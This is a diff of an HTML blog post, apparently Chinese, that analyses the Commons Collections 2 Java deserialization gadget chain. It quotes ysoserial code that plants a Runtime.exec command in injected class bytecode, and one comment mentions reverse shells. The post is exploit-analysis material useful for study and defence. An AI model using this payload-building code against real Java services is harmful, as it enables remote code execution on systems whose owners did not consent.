@@ -1,97 +1,77 @@
-<!DOCTYPE html>
-<html lang="zh">
-<head><meta http-equiv="Content-Type" content="text/html" charset="UTF-8" />
-<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-
-
-
-
-<link rel="stylesheet" href="/css/main.min.603bdac5a514a018c8a598608c9559e9356dee22c6203eb4ba7ad06c438010c7.css" integrity="sha256-YDvaxaUUoBjIpZhgjJVZ6TVt7iLGID60unrQbEOAEMc="/>
-
-
-
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Fira+Code&family=Lora&display=swap" rel="stylesheet">
-
-
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css">
-
-
-
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css">
-<script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script>
-
-
-
-<script src="https://cdn.jsdelivr.net/npm/code-line"></script><title>CommonsCollections2 利用链分析</title>
+<!doctype html><html lang=zh>
+<head><meta http-equiv=content-type content="text/html" charset=utf-8>
+<meta http-equiv=x-ua-compatible content="IE=edge,chrome=1">
+<meta name=viewport content="width=device-width,initial-scale=1">
+<link rel=stylesheet href="/css/main.min.603bdac5a514a018c8a598608c9559e9356dee22c6203eb4ba7ad06c438010c7.css" integrity="sha256-YDvaxaUUoBjIpZhgjJVZ6TVt7iLGID60unrQbEOAEMc=">
+<link rel=preconnect href=https://fonts.googleapis.com>
+<link rel=preconnect href=https://fonts.gstatic.com crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Fira+Code&family=Lora&display=swap" rel=stylesheet>
+<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css>
+<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css>
+<script src=https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js></script>
+<script src=https://cdn.jsdelivr.net/npm/code-line></script><title>CommonsCollections2 利用链分析</title>
 </head>
 <body class="flex flex-col bg-gray-100">
-
 <div class="flex my-8 font-serif">
-    <div class="flex-auto w-1/3">
-        <div class="w-64 h-full mr-2 ml-auto">
-            <div class="mb-8"><div class="border rounded-lg shadow-md">
-    <div class="h-32 flex rounded-t-lg text-white" style="background-image: url('/images/background-1.jpg')">
-        <div class="m-auto">
-            <div class="text-center font-serif text-3xl my-2"><a href="/">Noth</a></div>
-            <div class="text-center font-serif">去码头整点薯条</div>
-        </div>
-    </div>
-    <nav class="rounded-b-lg bg-white">
-        <ul class="py-2 ml-8">
-            <li class="my-2 content-center">
-                <a href="/" class="hover:text-red-300"><i class="fas fa-home"></i>&nbsp;&nbsp;&nbsp;主页</a>
-            </li>
-
-
-
-            <li class="my-2 content-center">
-                <a href="/metapages/archive/" class="hover:text-red-300"><i class="fas fa-scroll"></i>&nbsp;&nbsp;归档</a>
-            </li>
-            <li class="my-2 content-center">
-                <a href="/categories/" class="hover:text-red-300"><i class="fas fa-th"></i>&nbsp;&nbsp;&nbsp;分类</a>
-            </li>
-            <li class="my-2 content-center">
-                <a href="/tags/" class="hover:text-red-300"><i class="fas fa-tags"></i>&nbsp;&nbsp;标签</a>
-            </li>
-            <li class="my-2 content-center">
-                <a href="/metapages/link/" class="hover:text-red-300"><i class="fas fa-link"></i>&nbsp;&nbsp;&nbsp;链接</a>
-            </li>
-            <li class="my-2 content-center">
-                <a href="/metapages/message/" class="hover:text-red-300"><i class="fas fa-comment-alt"></i>&nbsp;&nbsp;&nbsp;留言</a>
-            </li>
-        </ul>
-    </nav>
+<div class="flex-auto w-1/3">
+<div class="w-64 h-full mr-2 ml-auto">
+<div class=mb-8><div class="border rounded-lg shadow-md">
+<div class="h-32 flex rounded-t-lg text-white" style=background-image:url(/images/background-1.jpg)>
+<div class=m-auto>
+<div class="text-center font-serif text-3xl my-2"><a href=/>Noth</a></div>
+<div class="text-center font-serif">去码头整点薯条</div>
+</div>
+</div>
+<nav class="rounded-b-lg bg-white">
+<ul class="py-2 ml-8">
+<li class="my-2 content-center">
+<a href=/ class=hover:text-red-300><i class="fas fa-home"></i>&nbsp;&nbsp;&nbsp;主页</a>
+</li>
+<li class="my-2 content-center">
+<a href=/metapages/archive/ class=hover:text-red-300><i class="fas fa-scroll"></i>&nbsp;&nbsp;归档</a>
+</li>
+<li class="my-2 content-center">
+<a href=/categories/ class=hover:text-red-300><i class="fas fa-th"></i>&nbsp;&nbsp;&nbsp;分类</a>
+</li>
+<li class="my-2 content-center">
+<a href=/tags/ class=hover:text-red-300><i class="fas fa-tags"></i>&nbsp;&nbsp;标签</a>
+</li>
+<li class="my-2 content-center">
+<a href=/metapages/link/ class=hover:text-red-300><i class="fas fa-link"></i>&nbsp;&nbsp;&nbsp;链接</a>
+</li>
+<li class="my-2 content-center">
+<a href=/metapages/message/ class=hover:text-red-300><i class="fas fa-comment-alt"></i>&nbsp;&nbsp;&nbsp;留言</a>
+</li>
+</ul>
+</nav>
 </div></div>
-            <div class="sticky top-2">
-                <div class="toc">
-    <nav id="TableOfContents">
-  <ul>
-    <li><a href="#gadget-chain">Gadget Chain</a></li>
-    <li><a href="#transformingcomparator构造">TransformingComparator构造</a></li>
-    <li><a href="#使用templatesimpl动态加载字节码">使用TemplatesImpl动态加载字节码</a></li>
-    <li><a href="#priorityqueue反序列化调用transformingcomparatorcompare">PriorityQueue反序列化调用TransformingComparator.compare()</a></li>
-    <li><a href="#poc验证">PoC验证</a></li>
-  </ul>
+<div class="sticky top-2">
+<div class=toc>
+<nav id=TableOfContents>
+<ul>
+<li><a href=#gadget-chain>Gadget Chain</a></li>
+<li><a href=#transformingcomparator构造>TransformingComparator构造</a></li>
+<li><a href=#使用templatesimpl动态加载字节码>使用TemplatesImpl动态加载字节码</a></li>
+<li><a href=#priorityqueue反序列化调用transformingcomparatorcompare>PriorityQueue反序列化调用TransformingComparator.compare()</a></li>
+<li><a href=#poc验证>PoC验证</a></li>
+</ul>
 </nav>
 </div>
-            </div>
-        </div>
-    </div>
-    <div class="flex-auto w-2/3">
-        <div class="w-200 border rounded-lg bg-white ml-2 mr-auto px-4">
-            <h1 class="font-serif text-4xl text-center mt-8 mb-2">CommonsCollections2 利用链分析</h1>
-            <div class="text-right text-gray-500 mr-20">
-                <span>
-                    Sep. 25, 2021 |
-                    <i class="far fa-bookmark"></i> 
-                </span>
-            </div>
-            <div class="content px-6 mb-8">
-                <h2 id="gadget-chain">Gadget Chain</h2>
-<pre tabindex="0"><code>/*
+</div>
+</div>
+</div>
+<div class="flex-auto w-2/3">
+<div class="w-200 border rounded-lg bg-white ml-2 mr-auto px-4">
+<h1 class="font-serif text-4xl text-center mt-8 mb-2">CommonsCollections2 利用链分析</h1>
+<div class="text-right text-gray-500 mr-20">
+<span>
+Sep. 25, 2021 |
+<i class="far fa-bookmark"></i>
+</span>
+</div>
+<div class="content px-6 mb-8">
+<h2 id=gadget-chain>Gadget Chain</h2>
+<pre tabindex=0><code>/*
    Gadget chain:
       ObjectInputStream.readObject()
          PriorityQueue.readObject()
@@ -102,185 +82,185 @@
                         Runtime.exec()
  */
 </code></pre><p>这个链分成两部分，前半部分为触发TransformingComparator.compare() ，后半部分则是通过其构造一个命令执行。</p>
-<h2 id="transformingcomparator构造">TransformingComparator构造</h2>
+<h2 id=transformingcomparator构造>TransformingComparator构造</h2>
 <p>首先看一下TransformingComparator#compare 这个函数：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">compare</span><span style="color:#f92672">(</span>Iobj1<span style="color:#f92672">,</span> Iobj2<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
-    O value1 <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">transformer</span><span style="color:#f92672">.</span><span style="color:#a6e22e">transform</span><span style="color:#f92672">(</span>obj1<span style="color:#f92672">);</span>
-    O value2 <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">transformer</span><span style="color:#f92672">.</span><span style="color:#a6e22e">transform</span><span style="color:#f92672">(</span>obj2<span style="color:#f92672">);</span>
-    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">decorated</span><span style="color:#f92672">.</span><span style="color:#a6e22e">compare</span><span style="color:#f92672">(</span>value1<span style="color:#f92672">,</span> value2<span style="color:#f92672">);</span>
-<span style="color:#f92672">}</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>int</span> <span style=color:#a6e22e>compare</span><span style=color:#f92672>(</span>Iobj1<span style=color:#f92672>,</span> Iobj2<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+    O value1 <span style=color:#f92672>=</span> <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>transformer</span><span style=color:#f92672>.</span><span style=color:#a6e22e>transform</span><span style=color:#f92672>(</span>obj1<span style=color:#f92672>);</span>
+    O value2 <span style=color:#f92672>=</span> <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>transformer</span><span style=color:#f92672>.</span><span style=color:#a6e22e>transform</span><span style=color:#f92672>(</span>obj2<span style=color:#f92672>);</span>
+    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>decorated</span><span style=color:#f92672>.</span><span style=color:#a6e22e>compare</span><span style=color:#f92672>(</span>value1<span style=color:#f92672>,</span> value2<span style=color:#f92672>);</span>
+<span style=color:#f92672>}</span>
 </code></pre></div><p>这里会调用transformer.transform() 处理对象，这个 transformer 是构造TransformingComparator 时传入的参数，这里感觉可以使用 CC1 中的 transformer 来实现命令执行，但是这里没有这样做，这里采用的是另一种方法。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">final</span> InvokerTransformer transformer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> InvokerTransformer<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;toString&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[</span>0<span style="color:#f92672">],</span> <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[</span>0<span style="color:#f92672">]);</span>
-<span style="color:#66d9ef">final</span> PriorityQueue<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span> queue <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> PriorityQueue<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;(</span>2<span style="color:#f92672">,</span><span style="color:#66d9ef">new</span> TransformingComparator<span style="color:#f92672">(</span>transformer<span style="color:#f92672">));</span>
-Reflections<span style="color:#f92672">.</span><span style="color:#a6e22e">setFieldValue</span><span style="color:#f92672">(</span>transformer<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;iMethodName&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;newTransformer&#34;</span><span style="color:#f92672">);</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#66d9ef>final</span> InvokerTransformer transformer <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> InvokerTransformer<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;toString&#34;</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[</span>0<span style=color:#f92672>],</span> <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[</span>0<span style=color:#f92672>]);</span>
+<span style=color:#66d9ef>final</span> PriorityQueue<span style=color:#f92672>&lt;</span>Object<span style=color:#f92672>&gt;</span> queue <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> PriorityQueue<span style=color:#f92672>&lt;</span>Object<span style=color:#f92672>&gt;(</span>2<span style=color:#f92672>,</span><span style=color:#66d9ef>new</span> TransformingComparator<span style=color:#f92672>(</span>transformer<span style=color:#f92672>));</span>
+Reflections<span style=color:#f92672>.</span><span style=color:#a6e22e>setFieldValue</span><span style=color:#f92672>(</span>transformer<span style=color:#f92672>,</span> <span style=color:#e6db74>&#34;iMethodName&#34;</span><span style=color:#f92672>,</span> <span style=color:#e6db74>&#34;newTransformer&#34;</span><span style=color:#f92672>);</span>
 </code></pre></div><p>这里我选出了与之相关的三行代码，第一行构造了一个InvokerTransfomer对象transformer ，而第二行则是用这个对象构造了TransformingComparator，第三行则是又通过反射将transformer 将要执行的方法设置为了 newTransformer。根据前面分析，这里应该是由transformer 来触发命令执行，但是如何由 newTransformer 触发命令执行呢？或者说，哪个对象的newTransformer可以触发命令执行呢？</p>
 <p>这里的关键就在于这个对象。查看CC2链的最开始，发现调用了一个Gadgets.createTemplatesImpl(command)，其构造了一个templates对象，事实上，就是这个对象的newTransformer会触发一个命令执行。不过也不是直接就能触发，具体的过程现在来分析一下。</p>
-<h2 id="使用templatesimpl动态加载字节码">使用TemplatesImpl动态加载字节码</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> Object <span style="color:#a6e22e">createTemplatesImpl</span><span style="color:#f92672">(</span><span style="color:#66d9ef">final</span> String command<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> Exception <span style="color:#f92672">{</span>
-    <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>Boolean<span style="color:#f92672">.</span><span style="color:#a6e22e">parseBoolean</span><span style="color:#f92672">(</span>System<span style="color:#f92672">.</span><span style="color:#a6e22e">getProperty</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;properXalan&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;false&#34;</span><span style="color:#f92672">)))</span> <span style="color:#f92672">{</span>
-        <span style="color:#66d9ef">return</span> createTemplatesImpl<span style="color:#f92672">(</span>
-            command<span style="color:#f92672">,</span>
-            Class<span style="color:#f92672">.</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;org.apache.xalan.xsltc.trax.TemplatesImpl&#34;</span><span style="color:#f92672">),</span>
-            Class<span style="color:#f92672">.</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;org.apache.xalan.xsltc.runtime.AbstractTranslet&#34;</span><span style="color:#f92672">),</span>
-            Class<span style="color:#f92672">.</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;org.apache.xalan.xsltc.trax.TransformerFactoryImpl&#34;</span><span style="color:#f92672">));</span>
-    <span style="color:#f92672">}</span>
+<h2 id=使用templatesimpl动态加载字节码>使用TemplatesImpl动态加载字节码</h2>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> Object <span style=color:#a6e22e>createTemplatesImpl</span><span style=color:#f92672>(</span><span style=color:#66d9ef>final</span> String command<span style=color:#f92672>)</span> <span style=color:#66d9ef>throws</span> Exception <span style=color:#f92672>{</span>
+    <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>Boolean<span style=color:#f92672>.</span><span style=color:#a6e22e>parseBoolean</span><span style=color:#f92672>(</span>System<span style=color:#f92672>.</span><span style=color:#a6e22e>getProperty</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;properXalan&#34;</span><span style=color:#f92672>,</span> <span style=color:#e6db74>&#34;false&#34;</span><span style=color:#f92672>)))</span> <span style=color:#f92672>{</span>
+        <span style=color:#66d9ef>return</span> createTemplatesImpl<span style=color:#f92672>(</span>
+            command<span style=color:#f92672>,</span>
+            Class<span style=color:#f92672>.</span><span style=color:#a6e22e>forName</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;org.apache.xalan.xsltc.trax.TemplatesImpl&#34;</span><span style=color:#f92672>),</span>
+            Class<span style=color:#f92672>.</span><span style=color:#a6e22e>forName</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;org.apache.xalan.xsltc.runtime.AbstractTranslet&#34;</span><span style=color:#f92672>),</span>
+            Class<span style=color:#f92672>.</span><span style=color:#a6e22e>forName</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;org.apache.xalan.xsltc.trax.TransformerFactoryImpl&#34;</span><span style=color:#f92672>));</span>
+    <span style=color:#f92672>}</span>
 
-    <span style="color:#66d9ef">return</span> createTemplatesImpl<span style="color:#f92672">(</span>command<span style="color:#f92672">,</span> TemplatesImpl<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">,</span> AbstractTranslet<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">,</span> TransformerFactoryImpl<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">);</span>
-<span style="color:#f92672">}</span>
+    <span style=color:#66d9ef>return</span> createTemplatesImpl<span style=color:#f92672>(</span>command<span style=color:#f92672>,</span> TemplatesImpl<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> AbstractTranslet<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> TransformerFactoryImpl<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>);</span>
+<span style=color:#f92672>}</span>
 </code></pre></div><p>这个方法内部会调用createTemplatesImpl，上下两种传入的参数不一样，但是实际上没有太大区别，那就看调用的这个方法是什么：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#f92672">&lt;</span>T<span style="color:#f92672">&gt;</span> T <span style="color:#a6e22e">createTemplatesImpl</span><span style="color:#f92672">(</span><span style="color:#66d9ef">final</span> String command<span style="color:#f92672">,</span> Class<span style="color:#f92672">&lt;</span>T<span style="color:#f92672">&gt;</span> tplClass<span style="color:#f92672">,</span> Class<span style="color:#f92672">&lt;?&gt;</span> abstTranslet<span style="color:#f92672">,</span> Class<span style="color:#f92672">&lt;?&gt;</span> transFactory<span style="color:#f92672">)</span>
-    <span style="color:#66d9ef">throws</span> Exception <span style="color:#f92672">{</span>
-    <span style="color:#66d9ef">final</span> T templates <span style="color:#f92672">=</span> tplClass<span style="color:#f92672">.</span><span style="color:#a6e22e">newInstance</span><span style="color:#f92672">();</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#f92672>&lt;</span>T<span style=color:#f92672>&gt;</span> T <span style=color:#a6e22e>createTemplatesImpl</span><span style=color:#f92672>(</span><span style=color:#66d9ef>final</span> String command<span style=color:#f92672>,</span> Class<span style=color:#f92672>&lt;</span>T<span style=color:#f92672>&gt;</span> tplClass<span style=color:#f92672>,</span> Class<span style=color:#f92672>&lt;?&gt;</span> abstTranslet<span style=color:#f92672>,</span> Class<span style=color:#f92672>&lt;?&gt;</span> transFactory<span style=color:#f92672>)</span>
+    <span style=color:#66d9ef>throws</span> Exception <span style=color:#f92672>{</span>
+    <span style=color:#66d9ef>final</span> T templates <span style=color:#f92672>=</span> tplClass<span style=color:#f92672>.</span><span style=color:#a6e22e>newInstance</span><span style=color:#f92672>();</span>
 
-    <span style="color:#75715e">// use template gadget class
-</span><span style="color:#75715e"></span>    ClassPool pool <span style="color:#f92672">=</span> ClassPool<span style="color:#f92672">.</span><span style="color:#a6e22e">getDefault</span><span style="color:#f92672">();</span>
-    pool<span style="color:#f92672">.</span><span style="color:#a6e22e">insertClassPath</span><span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> ClassClassPath<span style="color:#f92672">(</span>StubTransletPayload<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">));</span>
-    pool<span style="color:#f92672">.</span><span style="color:#a6e22e">insertClassPath</span><span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> ClassClassPath<span style="color:#f92672">(</span>abstTranslet<span style="color:#f92672">));</span>
-    <span style="color:#66d9ef">final</span> CtClass clazz <span style="color:#f92672">=</span> pool<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span>StubTransletPayload<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getName</span><span style="color:#f92672">());</span>
-    <span style="color:#75715e">// run command in static initializer
-</span><span style="color:#75715e"></span>    <span style="color:#75715e">// TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
-</span><span style="color:#75715e"></span>    String cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;java.lang.Runtime.getRuntime().exec(\&#34;&#34;</span> <span style="color:#f92672">+</span>
-        command<span style="color:#f92672">.</span><span style="color:#a6e22e">replaceAll</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;\\\\&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;\\\\\\\\&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">replaceAll</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;\&#34;&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;\\\&#34;&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">+</span>
-        <span style="color:#e6db74">&#34;\&#34;);&#34;</span><span style="color:#f92672">;</span>
-    clazz<span style="color:#f92672">.</span><span style="color:#a6e22e">makeClassInitializer</span><span style="color:#f92672">().</span><span style="color:#a6e22e">insertAfter</span><span style="color:#f92672">(</span>cmd<span style="color:#f92672">);</span>
-    <span style="color:#75715e">// sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
-</span><span style="color:#75715e"></span>    clazz<span style="color:#f92672">.</span><span style="color:#a6e22e">setName</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;ysoserial.Pwner&#34;</span> <span style="color:#f92672">+</span> System<span style="color:#f92672">.</span><span style="color:#a6e22e">nanoTime</span><span style="color:#f92672">());</span>
-    CtClass superC <span style="color:#f92672">=</span> pool<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span>abstTranslet<span style="color:#f92672">.</span><span style="color:#a6e22e">getName</span><span style="color:#f92672">());</span>
-    clazz<span style="color:#f92672">.</span><span style="color:#a6e22e">setSuperclass</span><span style="color:#f92672">(</span>superC<span style="color:#f92672">);</span>
+    <span style=color:#75715e>// use template gadget class
+</span><span style=color:#75715e></span>    ClassPool pool <span style=color:#f92672>=</span> ClassPool<span style=color:#f92672>.</span><span style=color:#a6e22e>getDefault</span><span style=color:#f92672>();</span>
+    pool<span style=color:#f92672>.</span><span style=color:#a6e22e>insertClassPath</span><span style=color:#f92672>(</span><span style=color:#66d9ef>new</span> ClassClassPath<span style=color:#f92672>(</span>StubTransletPayload<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>));</span>
+    pool<span style=color:#f92672>.</span><span style=color:#a6e22e>insertClassPath</span><span style=color:#f92672>(</span><span style=color:#66d9ef>new</span> ClassClassPath<span style=color:#f92672>(</span>abstTranslet<span style=color:#f92672>));</span>
+    <span style=color:#66d9ef>final</span> CtClass clazz <span style=color:#f92672>=</span> pool<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>StubTransletPayload<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>());</span>
+    <span style=color:#75715e>// run command in static initializer
+</span><span style=color:#75715e></span>    <span style=color:#75715e>// TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
+</span><span style=color:#75715e></span>    String cmd <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;java.lang.Runtime.getRuntime().exec(\&#34;&#34;</span> <span style=color:#f92672>+</span>
+        command<span style=color:#f92672>.</span><span style=color:#a6e22e>replaceAll</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;\\\\&#34;</span><span style=color:#f92672>,</span> <span style=color:#e6db74>&#34;\\\\\\\\&#34;</span><span style=color:#f92672>).</span><span style=color:#a6e22e>replaceAll</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;\&#34;&#34;</span><span style=color:#f92672>,</span> <span style=color:#e6db74>&#34;\\\&#34;&#34;</span><span style=color:#f92672>)</span> <span style=color:#f92672>+</span>
+        <span style=color:#e6db74>&#34;\&#34;);&#34;</span><span style=color:#f92672>;</span>
+    clazz<span style=color:#f92672>.</span><span style=color:#a6e22e>makeClassInitializer</span><span style=color:#f92672>().</span><span style=color:#a6e22e>insertAfter</span><span style=color:#f92672>(</span>cmd<span style=color:#f92672>);</span>
+    <span style=color:#75715e>// sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
+</span><span style=color:#75715e></span>    clazz<span style=color:#f92672>.</span><span style=color:#a6e22e>setName</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;ysoserial.Pwner&#34;</span> <span style=color:#f92672>+</span> System<span style=color:#f92672>.</span><span style=color:#a6e22e>nanoTime</span><span style=color:#f92672>());</span>
+    CtClass superC <span style=color:#f92672>=</span> pool<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>abstTranslet<span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>());</span>
+    clazz<span style=color:#f92672>.</span><span style=color:#a6e22e>setSuperclass</span><span style=color:#f92672>(</span>superC<span style=color:#f92672>);</span>
 
-    <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> classBytes <span style="color:#f92672">=</span> clazz<span style="color:#f92672">.</span><span style="color:#a6e22e">toBytecode</span><span style="color:#f92672">();</span>
+    <span style=color:#66d9ef>final</span> <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> classBytes <span style=color:#f92672>=</span> clazz<span style=color:#f92672>.</span><span style=color:#a6e22e>toBytecode</span><span style=color:#f92672>();</span>
 
-    <span style="color:#75715e">// inject class bytes into instance
-</span><span style="color:#75715e"></span>    Reflections<span style="color:#f92672">.</span><span style="color:#a6e22e">setFieldValue</span><span style="color:#f92672">(</span>templates<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;_bytecodes&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[][]{</span>
-        classBytes<span style="color:#f92672">,</span> ClassFiles<span style="color:#f92672">.</span><span style="color:#a6e22e">classAsBytes</span><span style="color:#f92672">(</span>Foo<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">)</span>
-    <span style="color:#f92672">});</span>
+    <span style=color:#75715e>// inject class bytes into instance
+</span><span style=color:#75715e></span>    Reflections<span style=color:#f92672>.</span><span style=color:#a6e22e>setFieldValue</span><span style=color:#f92672>(</span>templates<span style=color:#f92672>,</span> <span style=color:#e6db74>&#34;_bytecodes&#34;</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>new</span> <span style=color:#66d9ef>byte</span><span style=color:#f92672>[][]{</span>
+        classBytes<span style=color:#f92672>,</span> ClassFiles<span style=color:#f92672>.</span><span style=color:#a6e22e>classAsBytes</span><span style=color:#f92672>(</span>Foo<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>)</span>
+    <span style=color:#f92672>});</span>
 
-    <span style="color:#75715e">// required to make TemplatesImpl happy
-</span><span style="color:#75715e"></span>    Reflections<span style="color:#f92672">.</span><span style="color:#a6e22e">setFieldValue</span><span style="color:#f92672">(</span>templates<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;_name&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;Pwnr&#34;</span><span style="color:#f92672">);</span>
-    Reflections<span style="color:#f92672">.</span><span style="color:#a6e22e">setFieldValue</span><span style="color:#f92672">(</span>templates<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;_tfactory&#34;</span><span style="color:#f92672">,</span> transFactory<span style="color:#f92672">.</span><span style="color:#a6e22e">newInstance</span><span style="color:#f92672">());</span>
-    <span style="color:#66d9ef">return</span> templates<span style="color:#f92672">;</span>
-<span style="color:#f92672">}</span>
